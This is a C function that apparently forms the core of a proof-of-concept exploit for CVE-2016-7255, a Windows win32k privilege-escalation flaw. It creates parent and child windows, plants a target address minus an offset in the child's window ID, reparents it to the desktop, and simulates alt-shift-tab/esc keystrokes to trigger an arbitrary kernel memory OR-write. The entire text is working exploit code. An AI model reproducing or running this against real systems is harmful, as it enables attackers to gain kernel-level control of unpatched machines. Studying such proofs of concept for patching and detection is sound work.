int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = {0};

	HWND	hWndParent = NULL;
	HWND	hWndChild = NULL;

	WCHAR*	pszClassName = L"cve-2016-7255";
	WCHAR*	pszTitleName = L"cve-2016-7255";

	void*	pId = NULL;
	MSG		stMsg = {0};

	do 
	{

		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;
		
		if ( 0 == RegisterClassExW(&stWC) )
		{
			break;
		}

		hWndParent = CreateWindowExW(
			0,
			pszClassName,
			NULL,
			WS_OVERLAPPEDWINDOW|WS_VISIBLE,
			0,
			0,
			360,
			360,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPEDWINDOW|WS_VISIBLE|WS_CHILD,
			0,
			0,
			160,
			160,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);
		
		if (NULL == hWndChild)
		{
			break;
		}

		#ifdef _WIN64
			pId = ( (UCHAR*)pAddress - 0x28 ); 
		#else
			pId = ( (UCHAR*)pAddress - 0x14); 
		#endif // #ifdef _WIN64
		
		SetWindowLongPtr(hWndChild , GWLP_ID , (LONG_PTR)pId );

		DbgPrint("hWndChild = 0x%p\n" , hWndChild);
		DebugBreak();

		ShowWindow(hWndParent , SW_SHOWNORMAL);

		SetParent(hWndChild , GetDesktopWindow() );

		SetForegroundWindow(hWndChild);

		_sim_alt_shift_tab(4);
		
		SwitchToThisWindow(hWndChild , TRUE);
		
		_sim_alt_shift_esc();


		while( GetMessage(&stMsg , NULL , 0 , 0) )
		{	
			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);
		}
	

	} while (FALSE);

	if ( NULL != hWndParent )
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if ( NULL != hWndChild )
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName , GetModuleHandleW(NULL) );

	return 0;
}